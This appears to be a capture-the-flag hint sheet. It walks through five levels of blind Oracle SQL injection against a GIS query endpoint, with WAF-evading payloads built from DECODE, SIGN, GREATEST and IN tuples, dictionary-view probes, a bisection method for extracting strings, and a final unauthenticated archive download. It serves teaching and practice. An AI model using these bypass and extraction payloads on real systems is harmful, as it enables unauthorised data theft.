# FiberGrid CTF — progressive hints

Five levels. Each one is hidden behind a spoiler tag. Open them one at a
time; if you still cannot progress, `solve/WRITEUP.md` has the full solution.

---

## Level 1 — Where to look

<details>
<summary>Spoiler</summary>

The portal is only the shop window. Open the browser network tab or read
`robots.txt` and follow the API paths the portal itself calls. One of them
returns organisation data without asking for a token.

`solve/solve.py` prints this step as `Recon`.

</details>

---

## Level 2 — The query interface

<details>
<summary>Spoiler</summary>

The ArcGIS-style layer supports `where` and `returnCountOnly`. Any condition
you put in `where` changes the returned `count`. Start with something that is
always true and something that is always false, then prove that a subquery is
evaluated.

<details>
<summary>Payload sketch</summary>

```
where=1=1                     -> count > 0
where=1=2                     -> count = 0

where=1=(SELECT MIN(OBJECTID) FROM CBS.FWA_NOKTALAR)
```

</details>
</details>

---

## Level 3 — Surviving the WAF

<details>
<summary>Spoiler</summary>

The WAF rejects the classic vocabulary: boolean keywords, comments,
`COUNT(*)`, leading subqueries, and the ordering/pattern helpers you would
normally reach for in blind extraction (`<`, `>`, `LIKE`, `ILIKE`, `BETWEEN`,
`EXISTS`, `LIMIT`, ...). Read the rejection page carefully — it is a
value-based signature set, not a parser.

Ask yourself: which SQL primitives compute a comparison without using a
comparison operator, and which scalar functions does the appliance leave
alone?

<details>
<summary>Function set that passes</summary>

`DECODE`, `SIGN`, `GREATEST`, `NVL`, `MIN`, `MAX`, `LENGTH` — plus
equality-only subqueries and `IN (...)` tuples.

The classic pattern is:

```
1=(SELECT DECODE(SIGN(<expr>-<k>),1,1,-1) FROM <source>)
```

A true predicate returns the full row count; a false one returns `0`.

</details>
</details>

---

## Level 4 — The dictionary

<details>
<summary>Spoiler</summary>

Fingerprint the engine first: `SYS_GUID()` exists only in Oracle. Then read
the session schema with `user='CBS'`.

The dictionary views that survive the WAF are `TAB`, `COL`, `ALL_USERS` and
`DATABASE_PROPERTIES`. `TAB` lists the tables of the current schema — there
are exactly two and neither appears in the public service directory.

<details>
<summary>Concrete probes</summary>

```
where=1=(SELECT DECODE(MIN(TNAME),'A90312',1,-9) FROM TAB)
where=1=(SELECT DECODE(MAX(TNAME),'GUZERGAH',1,-9) FROM TAB)

where=1=(SELECT DECODE(MIN(CNAME),'OBJECTID',1,-9) FROM COL
         WHERE (TNAME,COLNO) IN (('GUZERGAH',1)))

where=1=(SELECT DECODE(MAX(PROPERTY_VALUE),'LDS_GISDB',1,-9)
         FROM DATABASE_PROPERTIES WHERE PROPERTY_NAME='GLOBAL_DB_NAME')
```

`AND` is blocked; notice how `IN (...)` carries a second condition without it.

</details>
</details>

---

## Level 5 — Extracting values and chaining

<details>
<summary>Spoiler</summary>

Extraction is done in two binary searches per string:

1. **Length** — `DECODE(SIGN(LENGTH(<expr>)-<k>),1,1,-1)` gives
   `length > k`. Bisect to the exact length.
2. **Characters** — for a known prefix `s`, the predicate
   `DECODE(GREATEST(<expr>,'s'||c),<expr>,1,-9)` is true exactly when the
   value is greater than or equal to `s||c`. Because comparisons are binary
   (ASCII) ordered, bisecting over the character set yields the next
   character; repeat until the length is reached.

The values you are after: `MIN(ACIKLAMA)` and `MAX(ACIKLAMA)` from `A90312`,
and `NOTLAR` from the route record whose `OBJECTID` you find with
`SIGN(MAX(OBJECTID)-k)`.

The `MAX(ACIKLAMA)` value is an archive name. Look at the portal API paths —
one of them serves archives and never checks who is asking.

<details>
<summary>Final requests</summary>

```
/webservice/api/Export?file=FTTH_ENVANTER_20260814_a91f3c.zip
```

The archive is a ZIP; the flag sits in the CSV.

</details>
</details>
